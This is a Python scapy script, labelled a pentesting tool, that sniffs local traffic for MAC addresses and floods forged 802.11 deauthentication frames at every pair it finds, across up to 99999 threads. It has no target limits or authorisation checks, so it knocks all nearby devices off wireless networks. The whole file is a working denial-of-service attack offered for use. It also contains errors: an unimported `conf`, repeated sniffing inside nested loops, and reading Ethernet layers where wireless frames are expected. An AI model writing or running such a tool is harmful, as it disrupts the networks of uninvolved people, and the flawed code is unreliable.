import logging
import argparse
from scapy.all import RadioTap, Dot11, Dot11Deauth, Ether, sniff, sendp
import concurrent.futures
import time


def die(target_mac, access_point_mac):
    try:
        logging.info("Kicking {} off from {}".format(target_mac, access_point_mac))
        interface = args.interface
        packet_count = args.packet_count
        interval = args.interval
        conf.iface = interface
        pkt = (
            RadioTap()
            / Dot11(addr1=target_mac, addr2=access_point_mac, addr3=access_point_mac)
            / Dot11Deauth()
        )
        sendp(pkt, inter=interval, count=packet_count, verbose=1)
    except Exception as e:
        logging.exception("An exception occurred in 'die' function: %s", str(e))


def maccy():
    interface = args.interface
    duration = args.duration
    packets = sniff(iface=interface, timeout=duration)
    mac_addresses = set()
    for packet in packets:
        if packet.haslayer(Ether):
            src_mac = packet[Ether].src
            dst_mac = packet[Ether].dst
            mac_addresses.add(src_mac)
            mac_addresses.add(dst_mac)
    for mac in mac_addresses:
        yield mac


def setup_logging():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")


if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Pentesting script for deauthentication attacks.")
    parser.add_argument("-i", "--interface", type=str, help="Network interface to use")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration of sniffing in seconds")
    parser.add_argument("-c", "--packet-count", type=int, default=100, help="Number of deauthentication packets to send")
    parser.add_argument("-p", "--interval", type=float, default=0.1, help="Interval between deauthentication packets")
    args = parser.parse_args()

    # Set up logging
    setup_logging()

    # Perform deauthentication attacks
    with concurrent.futures.ThreadPoolExecutor(max_workers=99999) as executor:
        for wifi in maccy():
            for device in maccy():
                try:
                    executor.submit(die, device, wifi)
                except Exception as e:
                    logging.exception("An exception occurred in submitting task: %s", str(e))
                    time.sleep(200)
                    executor.submit(die, device, wifi)

    logging.info("Done")
